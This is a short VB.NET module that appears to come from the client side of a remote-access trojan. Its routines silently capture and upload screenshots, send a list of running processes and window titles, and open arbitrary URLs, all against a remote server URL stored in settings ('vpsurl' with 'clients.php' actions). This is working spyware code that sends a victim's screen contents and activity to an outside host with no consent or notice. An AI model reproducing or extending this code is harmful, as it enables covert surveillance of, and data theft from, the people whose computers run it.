Imports System.Net

Module IndependantActions
    Public Sub TakeScreenshot(fileName As String, ByRef mainWebClient As WebClient)
        Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
        Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
        mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + fileName, bmpBytes)
    End Sub

    Public Sub OpenURL(url As String)
        Try
            Process.Start(url)
        Catch ex As System.ComponentModel.Win32Exception
            Exit Sub
        End Try
    End Sub

    Public Sub UploadRunningTasks(ByRef mainWebClient As WebClient)
        Dim total As String = ""
        For Each p As Process In Process.GetProcesses
            total += p.Id & "|"
            total += p.ProcessName & "|"
            total += p.MainWindowTitle & "|"
            total += (p.WorkingSet64 / 1024) / 1024 & "[;;]"
        Next
        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
    End Sub
End Module
